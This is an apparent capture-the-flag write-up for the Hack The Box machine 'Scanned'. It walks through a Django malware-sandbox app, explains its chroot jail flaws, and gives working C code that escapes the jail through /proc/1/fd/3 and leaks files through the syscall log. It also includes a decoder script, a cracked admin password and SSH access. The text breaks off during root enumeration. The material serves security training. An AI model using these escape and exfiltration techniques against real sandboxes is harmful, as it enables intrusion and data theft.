---
title: HTB: Scanned
url: https://0xdf.gitlab.io/2022/09/10/htb-scanned.html
date: 2022-09-10T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, hackthebox, htb-scanned, nmap, django, source-code, chroot, jail, sandbox-escape, makefile, ptrace, fork, dumbable, c, python, youtube, hashcat, shared-object
---

![Scanned](https://0xdfimages.gitlab.io/img/scanned-cover.png)

The entire Scanned challenge is focused on a single web application, and yet it’s one of the hardest boxes HackTheBox has published. The box starts with a website that is kind of like VirusTotal, where users can upload executables (Linux only) and they run, and get back a list of system calls and return values. The source for the site and the sandbox is also downloadable. In the source, I’ll see how the sandbox sets up chroot jails to isolate the malware. I’ll take advantage of two mistakes in the coding to write a binary that escapes the jail and reads the database for the application, including the Django admin password. That password also works for SSH. With a foothold on the box, I’ll abuse the sandbox again, this time writing a program that sleeps, and then calls a SetUID binary from outside the jail. During the sleep, I’ll load a malicious library into the jail that hijacks execution, and because the binary is SetUID, I get execution as root.

## Box Info

| Name | [Scanned](https://hackthebox.com/machines/scanned)  [Scanned](https://hackthebox.com/machines/scanned) [Play on HackTheBox](https://hackthebox.com/machines/scanned) |
| --- | --- |
| Release Date | [29 Jan 2022](https://twitter.com/hackthebox_eu/status/1486715759191478289) |
| Retire Date | 10 Sep 2022 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Scanned |
| Radar Graph | Radar chart for Scanned |
| First Blood User | 02:35:47[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 18:36:12[pottm pottm](https://app.hackthebox.com/users/141036) |
| Creator | [clubby789 clubby789](https://app.hackthebox.com/users/83743) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.141
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-13 13:56 EST
Nmap scan report for 10.10.11.141
Host is up (0.096s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oN scans/nmap-tcpscripts.nmap 10.10.11.141
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-13 13:58 EST
Nmap scan report for 10.10.11.141
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Malware Scanner
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.03 seconds

```

Based on the [OpenSSH version](https://packages.debian.org/search?keywords=openssh-server), the host is likely running Debian 11 bullseye.

### Website - TCP 80

#### Site

The site is MalScanner, a new free and open source software (FOSS) malware analysis sandbox:

![image-20220909124135548](https://0xdfimages.gitlab.io/img/image-20220909124135548.png)

There are two links on the index page. The last bullet has a link to the source at `/static/source.tar.gz`. The first link is a link to `/scanner/upload` which leads to an upload form:

![image-20220111161739114](https://0xdfimages.gitlab.io/img/image-20220111161739114.png)

I tried uploading a few sample binaries. Any Windows binary I uploaded (such as `nc64.exe` or compiled potato exploits) returned an error:

> There was an error logging this application

The front page said it was working from Debian 11 (which matches my analysis from `nmap`), so perhaps it doesn’t support Windows.

When I uploaded `/bin/id` from my VM, it returned log of all the system calls:

![image-20220111162249809](https://0xdfimages.gitlab.io/img/image-20220111162249809.png)

Clicking any of the buttons expands the logs of syscalls with their args and the results. For example, the “Medium Priority” ones:

[![image-20220111162447246](https://0xdfimages.gitlab.io/img/image-20220111162447246.png)](https://0xdfimages.gitlab.io/img/image-20220111162447246.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220111162447246.png)

There is one `access` call and then a bunch of `stat` calls.

#### Tech Stack

`nmap` shows that the box is Debian 10, using NGINX to host the website. The response headers don’t show much else, but looking at the source will show the site is created using the Python [Django](https://www.djangoproject.com/) framework.

I’ll skip the directory brute force given I have the source.

## Source Code Analysis

The source code Tar archive has two folders, `malscanner` and `sandbox`.

```

oxdf@hacky$ tar xf source.tar.gz 
oxdf@hacky$ ls
malscanner  sandbox  source.tar.gz

```

`malscanner` is a Python Django project, and `sandbox` is a custom C application.

### malscanner

#### Django Background

[This video](https://www.youtube.com/watch?v=jmX27FrCqqs) gives a nice overview of the structure of a Django project. A project (like `malscanner`) can have one or more applications (like `malscanner/sandbox`), as well as project-wide settings directory (that has the same folder name as the project, so `malscanner/malscanner`).

When a web request hits the server, it takes the following steps (copied from the [video above](https://www.youtube.com/watch?v=jmX27FrCqqs)):

![image-20220111191458336](https://0xdfimages.gitlab.io/img/image-20220111191458336.png)

#### Project Settings

From the project folder, `settings.py` defines the structure of the project. The `SECRET_KEY` variable is set to “REDACTED”, so that’s no use to me. Additionally, the project isn’t in DEBUG mode.

There are some installed default apps (including the admin application at `/admin`).

Even if the custom applications don’t use a database, things like the default admin application will, so one must be configured. It is set to a SQLite DB:

```

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': 'malscanner.db',
    }
}

```

That file is in the source, but it is 0 bytes.

It does specify the hash algorithm to be MD5:

```

PASSWORD_HASHERS = [
    "django.contrib.auth.hashers.MD5PasswordHasher"
]

```

Two additional custom variables are set here and used in the applications. `FILE_PATH` and `SBX_PATH` are set in the project level `settings.py` as:

```

FILE_PATH = "/var/www/malscanner/uploads"
SBX_PATH = "/var/www/malscanner/sandbox"

```

#### How Files Are Run

For this application, the `urls.py` in the project folder load the urls from `scanner`, `viewer`, as well as the build in Django admin application.

```

from django.contrib import admin
from django.urls import path, include, re_path

from . import views

urlpatterns = [
    path('scanner/', include("scanner.urls")),
    path('viewer/', include("viewer.urls")),
    path('admin/', admin.site.urls),
    re_path(r'^$', views.index, name='index'),
]

```

The root returns the index template in `/templates`. For each application, I can look at it’s `urls.py` file. The scanner application defines an index and `upload/`:

```

from django.urls import path

from . import views

urlpatterns = [
    path('', views.index, name='index'),
    path('upload/', views.upload_file, name='upload')
]

```

This links `/scanner` to the `index` function and `/scanner/upload` to the `upload_file` function in `malscanner/scanner/views.py`.

To figure out how the application handles an uploaded file, I’ll look at `malscanner/scanner/views.py`. The index (`/scanner`) just returns a message:

```

def index(request):
    return HttpResponse("Hello, world. You're at the polls index.")

```

If `/scanner/upload` is linked to `upload_file`:

```

def upload_file(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            md5 = handle_file(request.FILES['file'])
            return HttpResponseRedirect(f'/viewer/{md5}')
        else:
            return HttpResponse("Invalid form")
    else:
        return render(request, 'upload.html', {'form': UploadFileForm()})

def handle_file(file):
    md5 = calculate_file_md5(file)
    path = f"{settings.FILE_PATH}/{md5}"
    with open(path, 'wb+') as f:
        for chunk in file.chunks():
            f.write(chunk)
    os.system(f"cd {settings.SBX_PATH}; ./sandbox {path} {md5}")
    os.remove(path)
    return md5

```

If this is a GET request, it shows the form to upload. Otherwise, it passed the file to `handle_file`, and then redirects to `/viewer/{md5}` (where the hash is returned from `handle_file`). `handle_file` calculates the hash, and then writes the file to a file named by the MD5. Then it changes into the `SBX_PATH`, and calls `sandbox` passing in the path and hash.

#### How Logs Are Returned

The viewer application the viewer defines `/viewer/<str:md5>/` url to link to the `view_file` function in`malscanner/viewer/views.py`. This function gets the request as well as the `md5` variable:

```

def view_file(request, md5: str):
    path = f"{settings.SBX_PATH}/jails/{md5}"
    if not os.path.exists(path):
        raise Http404("A sample with this hash has not been uploaded.")
    logfile = f"{path}/log"
    if not os.path.exists(logfile):
        return HttpResponse("There was an error logging this application")
    syscalls = [call.render() for call in parse_log(logfile)]
    ignore = list(filter(lambda call: call[0] == SyscallClass.Ignore, syscalls))
    low = list(filter(lambda call: call[0] == SyscallClass.Low, syscalls))
    med = list(filter(lambda call: call[0] == SyscallClass.Medium, syscalls))
    high = list(filter(lambda call: call[0] == SyscallClass.High, syscalls))
    render_vars = {"md5": md5, "ignore": ignore, "low": low, "med": med, "high": high}
    return render(request, 'view.html', render_vars)

```

It looks for the log in the jail directory from the run in a file named `log`. It feeds that log into some parsing functions and then to the view template for the page.

`parse_log` opens a log file (from the sandbox run) and processes 64 byte chunks of data, unpacking them into an array called `nums`:

```

def parse_log(path):
    syscalls = []
    with open(path, 'rb') as f:
        chunk = f.read(8 * 8)
        nums = struct.unpack("q" * 8, chunk)
        while len(chunk) == 8*8:
            nums = struct.unpack("q" * 8, chunk)
            call = LoggedSyscall(nums)
            syscalls.append(call)
            chunk = f.read(8 * 8)
    return syscalls

```

For each, it creates a `LoggedSyscall` object and appends that to an array. `syscalls.py` has an array of predefined calls and their priority, name, syscall number, and argument count:

![image-20220907133006925](https://0xdfimages.gitlab.io/img/image-20220907133006925.png)

#### Jails

The source references a “jail”, and the page references using Linux features like `chroot`. Linux has a feature known as chroot jails, which will, for a given process, map `/` to some other folder on the main system. This picture from [Security Queens](https://securityqueens.co.uk/im-in-chroot-jail-get-me-out-of-here/) shows it nicely:

![img](https://0xdfimages.gitlab.io/img/Chroot-1.png)

The process in the jail thinks that the `/home/chroot` folder is `/`, and can’t read outside of that.

This is typically created and managed using the `chroot` [command](https://linux.die.net/man/1/chroot).

### Sandbox

#### Makefile

The `sandbox` folder has a `Makefile`, three C source files, and an empty `jails` directory. `Makefile` are instructions for how to compile an applition:

```

.PHONY: all clean

all: sandbox

jails:
        mkdir jails; chmod 0771 jails

sandbox: jails sandbox.c copy.c tracing.c
        gcc sandbox.c copy.c tracing.c -static -o sandbox
        sudo setcap 'cap_setpcap,cap_sys_admin,cap_setuid,cap_setgid,cap_sys_chroot=+eip' ./sandbox

clean:
        for i in $(shell find jails -maxdepth 2 -name proc); do sudo umount $$i; done
        rm -rf sandbox jails/*

```

This `Makefile` has four targets: `all`, `jails`, `sandbox`, and `clean`. Any other targets or files listed after `[target]:` are the targets or files required for the target. So running `sandbox` will require a `jails` directory and will run `jails` if it’s not there.

So running `make` in this directory (which is the same as running `make [first target]`, so `make all`) will build `sandbox`, which requires `jails`. When I run into errors like “fatal error: sys/capability.h: No such file or directory”, I’ll Google that error and find out what library I need to install (in that case, `apt install libcap-dev`). Once all that’s working, it generates `sandbox` with the required capabilities (assuming my user can run `sudo setcap`):

```

oxdf@hacky$ make
gcc sandbox.c copy.c tracing.c -static -o sandbox
sudo setcap 'cap_setpcap,cap_sys_admin,cap_setuid,cap_setgid,cap_sys_chroot=+eip' ./sandbox
oxdf@hacky$ ls
copy.c  jails  Makefile  sandbox  sandbox.c  tracing.c
oxdf@hacky$ getcap sandbox
sandbox = cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin+eip

```

#### sandbox.c

The `main` function is in `sandbox.c`, and it handles parsing the input arguments, and making sure that the binary is running with the right capabilities. Then it calls `make_jail`:

```

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <program> [uuid]\n", argv[0]);
        exit(-2);
    }
    if (strlen(argv[1]) > FILENAME_MAX - 50) {
        DIE("Program name too long");
    }
    if ((argv[1][0]) != '/') {
        DIE("Program path must be absolute");
    }
    umask(0);
    check_caps();
    int result = mkdir("jails", 0771);
    if (result == -1 && errno != EEXIST) {
        DIE( "Could not create jail directory");
    }
    char uuid[33] = {0};
    if (argc < 3) {
        generate_uuid(uuid);
    } else {
        memcpy(uuid, argv[2], 32);
    }
    uuid[32] = 0;
    make_jail(uuid, argv[1]);
}

```

`make_jail` creates a folder in the `jails` folder to run from, moves the necessary libraries into it, changes into that directory and calls `chroot(".")`, setting that directory as the root for this process, creating the jail:

```

// Create our jail folder and move into it
void make_jail(char* name, char* program) {
    jailsfd = open("jails", O_RDONLY|__O_DIRECTORY);
    if (faccessat(jailsfd, name, F_OK, 0) == 0) {
        DIE("Jail name exists");
    }
    int result = mkdirat(jailsfd, name, 0771);
    if (result == -1 && errno != EEXIST) {
        DIE( "Could not create the jail");
    }

    if (access(program, F_OK) != 0) {
        DIE("Program does not exist");
    }
    chdir("jails");
    chdir(name);
    copy_libs();
    do_namespaces();
    copy(program, "./userprog");
    if (chroot(".")) {DIE("Couldn't chroot #1");}
    if (setgid(1001)) {DIE("SGID");}
    if (setegid(1001)) {DIE("SEGID");}
    if (setuid(1001)) {DIE("SUID");};
    if (seteuid(1001)) {DIE("SEUID");};
    do_trace();
    sleep(3);
}

```

After making sure that the group and user ids are 1001, it calls `do_trace()`, then sleeps 3 seconds, and returns.

`do_namespaces()` is worth noting, as it will create new namespaces for the PIDs and network:

```

// Create PID and network namespace
void do_namespaces() {
    if (unshare(CLONE_NEWPID|CLONE_NEWNET) != 0) {DIE("Couldn't make namespaces");};
    // Create pid-1
    if (fork() != 0) {sleep(6); exit(-1);}
    mkdir("./proc", 0555);
    mount("/proc", "./proc", "proc", 0, NULL);
}

```

Calling `unshare` ([man](https://man7.org/linux/man-pages/man2/unshare.2.html)) on `CLONE_NEWNET` resets the network namespace, completely separating it from the networking stack used by the host (and preventing network activity back to my host from in the jail). The `unshare` on `CLONE_NEWPID` will reset the PID counter, so the next process will be PID 1.

Then it calls `fork`. The parent process (PID unknown) will get the child PID from `fork` (which will be non-zero), so it sleeps 6 seconds and exits.

The child process will get `0` returned from `fork`, so it continues along. But because the `CLONE_NEWPID` namespace was reset with `unshare`, this effectively means that resulting child (from now on considered the main process) will always be PID 1 in the jail, and that the additional forks upcoming will always be PID 2 and 3.

`do_trace` is defined in `tracer.c`. It sets permissions, including dropping all capabilities, and then forks twice. The first fork calls `do_child`, the next one splits into `do_killer` and `do_log`.

```

void do_trace() {
    // We started with capabilities - we must reset the dumpable flag
    // so that the child can be traced
    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0);
    // Remove dangerous capabilities before the child starts
    struct user_cap_header_struct header;
    struct user_cap_data_struct caps;
    char pad[32];
    header.version = _LINUX_CAPABILITY_VERSION_3;
    header.pid = 0;
    caps.effective = caps.inheritable = caps.permitted = 0;
    syscall(SYS_capget, &header, &caps);
    caps.effective = 0;
    caps.permitted = 0;
    syscall(SYS_capset, &header, &caps);
    int child = fork();
    if (child == -1) {
        DIE("Couldn't fork");
    }
    if (child == 0) {
        do_child();
    }
    int killer = fork();
    if (killer == -1) {
        DIE("Couldn't fork (2)");
    }
    if (killer == 0) {
        do_killer(child);
    } else {
        do_log(child);
    }
}

```

At this point, there are three processes running in the jail, with PIDs 1, 2, and 3:

| PID | Function |
| --- | --- |
| 1 | `do_log(child)` |
| 2 | `do_child()` |
| 3 | `do_killer(child)` |

`do_child` first closes the file descriptor for `jailsfd` that was opened earlier, with a comment that it’s preventing escape. Then it sets the process as traceable (`PTRACE_TRACEME`) and then `execve` the passed in program:

```

void do_child() {
    // Prevent child process from escaping chroot
    close(jailsfd);
    prctl(PR_SET_PDEATHSIG, SIGHUP);
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    char* args[] = {NULL};
    execve("/userprog", args, NULL);
    DIE("Couldn't execute user program");
}

```

`do_killer` sleeps for five seconds, then kills the child process, and exits:

```

void do_killer(int pid) {
    sleep(5);
    if (kill(pid, SIGKILL) == -1) {DIE("Kill err");}
    puts("Killed subprocess");
    exit(0);
}

```

`do_log` traces the child process, entering a while true loop, which exits when it gets a signal that the child process exited. Otherwise, it loops using `PTRACE_SYSCALL`:

```

void do_log(int pid) {
    int status;
    waitpid(pid, &status, 0);
    struct user_regs_struct regs;
    struct user_regs_struct regs2;
    while (1) {
        // Enter syscall
        ptrace(PTRACE_SYSCALL, pid, 0, 0);
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) || WIFSIGNALED(status)) {
            puts("Exited");
            return;
        }
        ptrace(PTRACE_GETREGS, pid, 0, &regs);
        // Continue syscall
        ptrace(PTRACE_SYSCALL, pid, 0, 0);
        waitpid(pid, &status, 0);
        ptrace(PTRACE_GETREGS, pid, 0, &regs2);
        log_syscall(regs, regs2.rax);
    }
}

```

The [man page for ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html) says about `PTRACE_SYSCALL`:

> ```

> So, for PTRACE_SYSCALL,
>               for example, the idea is to inspect the arguments to the
>               system call at the first stop, then do another
>               PTRACE_SYSCALL and inspect the return value of the system
>               call at the second stop.
>
> ```

So that’s why it’s call twice in the loop, and the first time it gets all the registers, and then the second time just RAX (the return value).

#### Logging

The `log_syscall` function creates a `registers` object, which holds eight unsigned long values ([which on 64-bit Linux](https://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models) is 64-bits or 8 bytes each, matching the register size):

```

typedef struct __attribute__((__packed__)) {
    unsigned long rax;
    unsigned long rdi;
    unsigned long rsi;
    unsigned long rdx;
    unsigned long r10;
    unsigned long r8;
    unsigned long r9;
    unsigned long ret;
} registers;

void log_syscall(struct user_regs_struct regs, unsigned long ret) {
    registers result;
    result.rax = regs.orig_rax;
    result.rdi = regs.rdi;
    result.rsi = regs.rsi;
    result.rdx = regs.rdx;
    result.r10 = regs.r10;
    result.r8 = regs.r8;
    result.r9 = regs.r9;
    result.ret = ret;
    int fd = open("/log", O_CREAT|O_RDWR|O_APPEND, 0777);
    if (fd == -1) {
        return;
    }
    write(fd, &result, sizeof(registers));
    close(fd);
}

```

`orig_rax` is the Syscall being made. It writes this binary struct to `/log`, which fits with how the log files are read from the Django app above.

### Vulnerabilities

There’s two issues with the code above. First, at the top of `do_trace`, there’s a call to `prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0)`. By default, for a privileged process (which this is due to the capabilities), it will not be dumpable, and thus not able to be traced. This call is necessary for the functioning of the application. However, the code does this before the forks, and thus all three processes are traceable, not just the child.

The second issue kind of the opposite. The `jailsfd` is closed in `do_child`, but not in the other two forks. This is the file descriptor for the directory containing all the jails, including the one the process is running from, and thus is outside of the jail. If I can reference this directory / file descriptor, I’ll have access to the entire filesystem.

## Sandbox Exploit

### File Read Strategy

#### Intended Exploit

The two vulnerabilities above provide the steps to get arbitrary file read on the Scanner system outside the jail. The intended path is to make a binary that will first binary attach to the parent process (which will always be PID 1 within the new namespace), write shellcode into it, and set RIP to point to that code. Having hijacked this process, now I’ll have access to the file descriptor outside the jail, and thus can access the entire file system. That’s because `chroot` only impacts absolute paths. If I can get a handle to something outside the jail, I can work relative to that to access the full filesystem. It can read a file, and write it back into the `log` file in the jail, so that webpage will read it and return it to me.

Because all the capabilities on the binary are dropped in the `do_trace` call after the jails are set up and before forking any of the processes, I will only be able to read files as the user that hosts the web site:

```

    struct user_cap_header_struct header;
    struct user_cap_data_struct caps;
    char pad[32];
    header.version = _LINUX_CAPABILITY_VERSION_3;
    header.pid = 0;
    caps.effective = caps.inheritable = caps.permitted = 0;
    syscall(SYS_capget, &header, &caps);
    caps.effective = 0;
    caps.permitted = 0;
    syscall(SYS_capset, &header, &caps);

```

Still, that’s useful.

#### Shortcut

Coding up a binary to attach to the main process and inject shellcode is complicated, and there’s a shortcut way to get access to the open file descriptor in processes 1 and 3 from 2. In the `do_namespaces` call, it also created a `/proc` folder in the root of the jail, and then mounted that as `/proc` (in the jail). This means that each of the three processes will have folders in that `/proc`. And because each is owned by the same user and this is Debian, each can read from each others. This means that my running binary can access the path outside the jail at `/proc/1/fd/3`, and better yet, can just step up from that by adding relative paths like `/proc/1/fd/3/../../../../../../etc/passwd`.

Why does it matter that the OS is Debian? When the kernel is going to trace another process or access another processes `/proc/`, it looks at `/proc/sys/kernel/yama/ptrace_scope` (detailed definition [here](https://www.kernel.org/doc/Documentation/security/Yama.txt)). In most distros, this is set to `1` by default, which means that you can only trace or access descendant processes. So PID 1 can trace 2 or 3, but neither 2 nor 3 can access any of the others. But Debian has decided (reasons detailed [here](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=712740)) to default to `0`, which means that a process can attach (and/or access `/proc`) to any other process running under the same UID, as long as it is dumpable.

### Exfil Strategy

The only output I’ll get from the uploaded binary is a series of syscalls, their arguments, and return values. To keep it simple, I’ll have my binary write the data to 64 byte chunks, setting the syscall to something I can pick out and wouldn’t expect otherwise (0xdfdf), and the return value to the next eight bytes of exfil. Then I can scrape down the syscalls from the page and use the return code data to rebuild that file.

### Exploit

Finding the exploit is very complicated and difficult. Actually writing it is, by comparison, not too bad.

#### Write Into Log

To start, I’ll prove that I can write to the `/log` file something that I can collect in the output.

```

#include <stdio.h>

int main() {
    FILE *log = fopen("/log", "a");
    char buf[64] = {0};
    ((unsigned long*)buf)[0] = 0xdfdf;
    fwrite(buf,1,64,log);

    fclose(log);
}

```

This simply creates a 64 byte buffer, sets the first element to 0xdfdf (57311 in decimal), writes that to the log, and exits. If this works, I’d expect to see a Syscall 57311 in the logs with return 0.

I’ll compile the binary with `gcc -o poc read_file.c`, and upload `poc`. In the results, in the “Ignored Syscalls” section, I’ll find it:

![image-20220907141700007](https://0xdfimages.gitlab.io/img/image-20220907141700007.png)

#### Read File

Now I’ll try to read a file outside the jail and put the first eight bytes into that same log:

```

#include <stdio.h>

int main() {
    FILE *file_to_read = fopen("/proc/1/fd/3/../../../../../../../etc/passwd", "r");
    FILE *log = fopen("/log", "a");
    char buf[64] = {0};
    ((unsigned long*)buf)[0] = 0xdfdf;
    fread(&buf[56], 1, 8, file_to_read);
    fwrite(buf,1,64,log);

    fclose(file_to_read);
    fclose(log);
}

```

The `fread` will get 8 bytes from `passwd` and store it 56 bytes into the 64 byte buffer, which is where the return code goes.

When I compile and upload this one, the entry for 0xdfdf has a non-zero response:

![image-20220907142040142](https://0xdfimages.gitlab.io/img/image-20220907142040142.png)

That decodes to `root:x:0` (once the byte order is fixed):

```

>>> bytes.fromhex('303a783a746f6f72').decode()
'0:x:toor'
>>> bytes.fromhex('303a783a746f6f72').decode()[::-1]
'root:x:0'

```

That’s success.

#### Read Entire File

Next I want to get more than eight bytes. I’ll loop over the file, reading 8 bytes into the return address, and and writing another log entry:

```

#include <stdio.h>

int main() {

    size_t bytesRead = 0;

    FILE *file_to_read = fopen("/proc/1/fd/3/../../../../../../../etc/passwd", "r");
    FILE *log = fopen("/log", "a");
    char buf[64] = {0};
    ((unsigned long*)buf)[0] = 0xdfdf;

    while ((bytesRead = fread(&buf[56], 1, 8, file_to_read)) > 0) {
        fwrite(buf,1,64,log);
    }

    fclose(file_to_read);
    fclose(log);
}

```

This returns 182 syscalls!

![image-20220907142608161](https://0xdfimages.gitlab.io/img/image-20220907142608161.png)

#### Script File Download

I’ll write a Python script to grab all the syscalls and rebuild the file from that. [This video](https://www.youtube.com/watch?v=nGm36Hd-p4s) shows the development of the exploit:

The final script is:

```

#!/usr/bin/env python3

import re
import requests
import struct
import sys

if len(sys.argv) < 3:
    print(f"{sys.argv[0]} [url] [file]")
    exit()

resp = requests.get(sys.argv[1])
if resp.status_code != 200:
    print("Failed to fetch page")
    exit()

words = re.findall(r"sys_57311\(\) = 0x([a-f0-9]+)", resp.text)

res_file = b''.join([struct.pack("Q", int(w, 16)) for w in words])
with open(sys.argv[2], "wb") as f:
    f.write(res_file)

```

## Shell as clarence

### Exploit

I’ll modify the exploit to go after the `malscanner.db` file that I noted in the sourcecode. The version in the source download was empty, but there could be more in there on production.

```

    FILE *file_to_read = fopen("/proc/1/fd/3/../../../../../var/www/malscanner/malscanner.db", "r");

```

When I compile and upload, there are a *lot* more Ignored Syscalls:

![image-20220907153245255](https://0xdfimages.gitlab.io/img/image-20220907153245255.png)

It works:

```

oxdf@hacky$ python3 decode.py http://10.10.11.141/viewer/a8e593808380b5999301881b5c821d36/ malscanner.db
oxdf@hacky$ file malscanner.db 
malscanner.db: SQLite 3.x database, last written using SQLite version 3034001

```

### Get Password

#### Read malscanner.db

I’ll open the file in `sqlite3`, but it seems it’s corrupt:

```

oxdf@hacky$ sqlite3 malscanner.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
Error: database disk image is malformed

```

Running strings on the binary, this line jumps out:

```

md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074clarence2021-09-14 18:36:46.227819

```

It seems like it has a hash, a date, a username, and another date. If that’s right, then this is a hash:

```

md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf

```

#### Crack Password

The hash is of the format described [here](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.django_std.html#id3), `{ident}${salt}${hash}`. The hash is calculated by combining the salt and then the password.

To crack a salted MD5 hash in `hashcat`, I’ll use mode 20 from the [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page, `md5($salt.$pass)`. It needs the hash in the format `{hash}:{salt}`, so mine becomes:

```

9886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m

```

It cracks almost instantly:

```

$ hashcat -m 20 hash /usr/share/wordlists/rockyou.txt 
...[snip]...
9886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m:onedayyoufeellikecrying
...[snip]...

```

#### Django Admin

This hash does work to log into the Django admin interface as clarence:

![image-20220112165850279](https://0xdfimages.gitlab.io/img/image-20220112165850279.png)

I could look around here more, but I don’t need to.

### SSH

I’ll note that clarence is a user on the machine from the `/etc/passwd` file. This password also works over SSH to get a connection:

```

oxdf@hacky$ sshpass -p 'onedayyoufeellikecrying' ssh clarence@10.10.10.21
...[snip]...
clarence@scanner:~$ 

```

And `user.txt`:

```

clarence@scanner:~$ cat user.txt
10247fad************************

```

## Shell as root

### Enumeration

There’s very little on the box of interest that I haven’t already looked at.

Clarence’s home directory is very empty:

```

clarence@scanned:~$ ls -la
total 28
drwxr-xr-x 3 clarence clarence 4096 Sep 14  2021 .
drwxr-xr-x 3 root     root     4096 Sep 14  2021 ..
lrwxrwxrwx 1 clarence clarence    9 Sep 14  2021 .bash_history -> /dev/null
-rw-r--r-- 1 clarence clarence  220 Sep 14  2021 .bash_logout
-rw-r--r-- 1 clarence clarence 3526 Sep 14  2021 .bashrc
drwxr-xr-x 3 clarence clarence 4096 Sep 14  2021 .local
-rw-r--r-- 1 clarence clarence  807 Sep 14  2021 .profile
-r-------- 1 clarence clarence   33 Jul 20 14:12 user.txt

```

There are no other directories in `/home`.

### Playing With malscanner

#### Permissions

There’s nothing really interesting in the process list other than stuff supporting the malscanner web application. The `chroot` called from `sandbox` requires elevated permissions, which it achieves via Linux [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) (consistent with the `Makefile` from the source):

```

clarence@scanned:/var/www/malscanner/sandbox$ ls -l
total 816
drwxrwxrwx 2 root root   4096 Sep  7 20:35 jails
-rwxr-xr-x 1 root root 827952 Sep 14  2021 sandbox
clarence@scanned:/var/www/malscanner/sandbox$ /usr/sbin/getcap sandbox 
sandbox cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin=eip

```

It isn’t running as SetUID, but rather is given capabilities (consistent with the `Makefile` from the source).

#### Running Manually

It’s worth noting that every 5 minutes a cleanup process clears out all the jails, so I may need to run a few times to understand what’s going on, and the jail UUID may change as I work.

If I run `sandbox` manually, I can look at what gets created:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /usr/bin/id 
<program name unknown>: error while loading shared libraries: libselinux.so.1: cannot open shared object file: No such file or directory
Exited

```

The running errors out, but the jail is left behind:

```

clarence@scanned:/var/www/malscanner/sandbox$ ls jails/e31111f2000db36df3ad97a23e9f89a4/
bin  lib  lib64  log  proc  userprog  usr

```

The `log` file has entries to report back:

```

clarence@scanned:/var/www/malscanner/sandbox$ ls -l jails/e31111f2000db36df3ad97a23e9f89a4/log
-rwxrwxrwx 1 sandbox sandbox 4416 Sep  8 16:25 jails/e31111f2000db36df3ad97a23e9f89a4/log
clarence@scanned:/var/www/malscanner/sandbox$ xxd jails/e31111f2000db36df3ad97a23e9f89a4/log
00000000: 0c00 0000 0000 0000 0000 0000 0000 0000  ................
00000010: d04a ce71 8a55 0000 486e 89e3 ff7f 0000  .J.q.U..Hn......
00000020: 0010 0000 0000 0000 0100 0000 0000 0000  ................
00000030: 0100 0000 0000 0000 0040 6c72 8a55 0000  .........@lr.U..
00000040: 1500 0000 0000 0000 b0c9 c630 317f 0000  ...........01...
00000050: 0400 0000 0000 0000 c871 c430 317f 0000  .........q.01...
00000060: 0800 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 feff ffff ffff ffff  ................
00000080: 0101 0000 0000 0000 9cff ffff 0000 0000  ................
00000090: 679b c630 317f 0000 0000 0800 0000 0000  g..01...........
...[snip]...

```

The run errored because it couldn’t find a needed library. That’s because the source shows that while it is set up to do more, only `libc.so.6` is copied into the jail, along with the loaded, `ld-linux-x86-64.so.2`:

```

void copy_libs() {
    char* libs[] = {"libc.so.6", NULL};
    char path[FILENAME_MAX] = {0};
    char outpath[FILENAME_MAX] = {0};
    system("mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin");
    for (int i = 0; libs[i] != NULL; i++) {
        sprintf(path, "/lib/x86_64-linux-gnu/%s", libs[i]);
        // sprintf(path, "/lib/%s", libs[i]);
        sprintf(outpath, "./usr/lib/%s", libs[i]);
        copy(path, outpath);
    }
    copy("/lib64/ld-linux-x86-64.so.2", "./usr/lib64/ld-linux-x86-64.so.2");
    system("ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin");
}

```

It’s also worth noting that if I use a SetUID binary (like `su`), when it copies the binary into the jail, it loses the SetUID.

#### Fixing Library Error

The error for the missing library sent me down a useful rabbit hole - Can I copy the library into the jail in time for `id` to use it? I’ll use the optional argument for `sandbox` to name my jail (`a`), so I can predict the folder I need to copy into.

